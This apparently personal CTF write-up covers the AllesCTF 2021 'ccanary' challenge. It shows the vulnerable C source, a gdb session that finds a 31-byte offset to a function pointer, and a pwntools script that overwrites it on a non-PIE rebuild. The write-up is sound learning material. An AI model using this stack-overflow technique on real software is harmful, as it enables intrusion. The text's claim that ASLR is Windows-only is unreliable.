# CCANARY ALLESCTF 2021
`ccanary` was a easy pwn challenge from the AllesCTF 2021, in this README we'll look deep into `vsyscall` and `PIE`

## Reading the Source
```c
// clang -o ccanary ccanary.c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

void ignore_me_init_buffering() {
    setvbuf(stdout, NULL, _IONBF, 0);
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stderr, NULL, _IONBF, 0);
}

void canary(void) { puts("canary: *chirp* *chirp*"); }

struct data {
    char yourinput[32];
    void (*call_canary)();
    int give_flag;
};

// FIXME: this partial-overwrite mitigation sucks :/
void quotegets(char* inp) {
    *inp = '"';
    // read input
    for (; *inp != '\n';)
        *++inp = fgetc(stdin);
    // append postfix
    for (char* postfix = "\"\n- you, 2021"; *postfix; postfix++)
        *inp++ = *postfix;
    // NUL-terminate
    *inp = 0;
}

int main(void) {
    ignore_me_init_buffering();
    struct data data = {
        .yourinput = { 0 },
        .call_canary = canary,
        .give_flag = 0,
    };

    printf("quote> ");
    quotegets((char*) &data.yourinput);

    data.call_canary();
    puts("good birb!");

    puts("");
    puts((char*) &data.yourinput);

    if (data.give_flag) {
        puts("Here's the flag:");
        system("cat flag");
    }
    return 0;
}
```

We have a `poor man` implementation of `gets` function call using `fgetc` until a `\n` is found...
This allow us to overwrite pretty much anything on the stack, but i'm pretty sure security have been enabled, let's check it out.

## Program Securities
```bash
[*] '/home/spacek9/Documents/CTF/AllesCTF/ccanary/ccanary'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

Okay so we have `NX` or "Linux DEP", and we have `PIE`, now what is truly `PIE` and `NX` ?

#### PIE
PIE Stands for `Position Independent Executable`, it makes sure address are randomized everytime you run the program. It works like `ASLR` but `ASLR` is for Windows, Linux uses `PIE` and `PIC`

Go read the following article by RedHat on `PIE`, it explains more detail than i can in a CTF Writeup...
https://access.redhat.com/blogs/766093/posts/1975793

#### NX
NX stands for `No Executable` and it works a bit like `DEP` or `Data Execution Prevention` on Windows.

The NX bit (no-execute) is a technology used in CPUs to segregate areas of memory for use by either storage of processor instructions (code) or for storage of data, a feature normally only found in Harvard architecture processors. However, the NX bit is being increasingly used in conventional von Neumann architecture processors for security reasons. 

The general technique, known as executable space protection, also called Write XOR Execute, is used to prevent certain types of malicious software from taking over computers by inserting their code into another program's data storage area and running their own code from within this section; one class of such attacks is known as the buffer overflow attack. 

Basically, NX stops us from executing our shellcode on the stack...

#### Trying to exploit the program
First thing first we're going to exploit the program without `PIE` enabled, for this we are going to recompile the given source code into a new binary using following command
`$ gcc ccanary.c -no-pie -o ccanary-nopie`

Now i'll just put the file in GDB and put a breakpoint right after our calls to `fgetc`
```asm
0x00000000004012aa <+92>:    call   0x4011d6 <quotegets>
0x00000000004012af <+97>:    mov    rdx,QWORD PTR [rbp-0x10]    ; We want to break here
0x00000000004012b3 <+101>:   mov    eax,0x0
$ b *main+97
```
Now let's run it with a `cyclic` pattern
`$ r <<<$(cyclic 200)`

```asm
Breakpoint 1, 0x00000000004012b3 in main ()
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
───────────────────────────────────────────────────────────────────────[ REGISTERS ]────────────────────────────────────────────────────────────────────────
 RAX  0x7fffffffdcf6 ◂— 0x0
 RBX  0x0
 RCX  0x7ffff7ecce8e (read+14) ◂— cmp    rax, -0x1000 /* 'H=' */
 RDX  0x61616a6161616961 ('aiaaajaa')
 RDI  0x0
 RSI  0x7ffff7f9ca03 (_IO_2_1_stdin_+131) ◂— 0xf9f680000000000a /* '\n' */
 R8   0x0
 R9   0x7
 R10  0x7ffff7fef440 (strcmp+4784) ◂— pxor   xmm0, xmm0
 R11  0x246
 R12  0x401080 (_start) ◂— xor    ebp, ebp
 R13  0x0
 R14  0x0
 R15  0x0
 RBP  0x7fffffffdc50 ◂— 'amaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab"\n- you, 2021'
 RSP  0x7fffffffdc20 ◂— 0x6161626161616122 ('"aaaabaa')
 RIP  0x4012b3 (main+101) ◂— mov    eax, 0
─────────────────────────────────────────────────────────────────────────[ DISASM ]─────────────────────────────────────────────────────────────────────────
 ► 0x4012b3 <main+101>    mov    eax, 0
   0x4012b8 <main+106>    call   rdx
 
   0x4012ba <main+108>    lea    rdi, [rip + 0xd71]
   0x4012c1 <main+115>    call   puts@plt                      <puts@plt>
 
   0x4012c6 <main+120>    lea    rdi, [rip + 0xd70]
   0x4012cd <main+127>    call   puts@plt                      <puts@plt>
 
   0x4012d2 <main+132>    lea    rax, [rbp - 0x30]
   0x4012d6 <main+136>    mov    rdi, rax
   0x4012d9 <main+139>    call   puts@plt                      <puts@plt>
 
   0x4012de <main+144>    mov    eax, dword ptr [rbp - 8]
   0x4012e1 <main+147>    test   eax, eax
─────────────────────────────────────────────────────────────────────────[ STACK ]──────────────────────────────────────────────────────────────────────────
00:0000│ rsp 0x7fffffffdc20 ◂— 0x6161626161616122 ('"aaaabaa')
01:0008│     0x7fffffffdc28 ◂— 0x6161646161616361 ('acaaadaa')
02:0010│     0x7fffffffdc30 ◂— 'aeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab"\n- you, 2021'
03:0018│     0x7fffffffdc38 ◂— 'agaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab"\n- you, 2021'
04:0020│     0x7fffffffdc40 ◂— 'aiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab"\n- you, 2021'
05:0028│     0x7fffffffdc48 ◂— 'akaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab"\n- you, 2021'
06:0030│ rbp 0x7fffffffdc50 ◂— 'amaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab"\n- you, 2021'
07:0038│     0x7fffffffdc58 ◂— 'aoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab"\n- you, 2021'
───────────────────────────────────────────────────────────────────────[ BACKTRACE ]────────────────────────────────────────────────────────────────────────
 ► f 0         0x4012b3 main+101
   f 1 0x6161706161616f61
   f 2 0x6161726161617161
   f 3 0x6161746161617361
   f 4 0x6161766161617561
   f 5 0x6161786161617761
   f 6 0x61617a6161617961
   f 7 0x6161636261616262
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
```

We can use `x/wx` on `$rbp-0x10` which is our `function pointer (.call_canary)`, if we overwrite the address of this call with the address where we print our flag in the main function we can win the challenge...

Let's find the offset of `$rbp-0x10` on the stack first
```
$ x/wx $rbp-0x10
0x61616961
$ cyclic -l 0x61616961
31
```

So we have a offset of 31, we can write this python script to overwrite the address at `$rbp-0x10` for (in my case) `0x00000000004012f1`
```py
from pwn import *

io = process("./canary-nopie")
io.sendline(b"a"*31 + p64(0x00000000004012f1))
io.interactive()
```
And it will print our fake flag... 
![image](https://user-images.githubusercontent.com/61102077/132341612-d09b928a-8e7c-4bcb-8ec8-221554ff7d34.png)

But note that thi code will not work on the challenge itself !!! PIE is enabled and we don't know the address where we win in main for the remote program. So what we do ???

I wasn't able to solve this challenge either until the CTF ended ! After that people started sharing their writeups and i learned some new stuff on linux `vsyscalls` which are `virtual syscalls`

###

## Exploiting the Program
![image](https://user-images.githubusercontent.com/61102077/132337668-a1cf6be2-d2e8-4588-aa8c-126ac8c05a20.png)

`vsyscalls` shouldn't be enabled on your system by default, hence the flag saying `this might not work on your system`
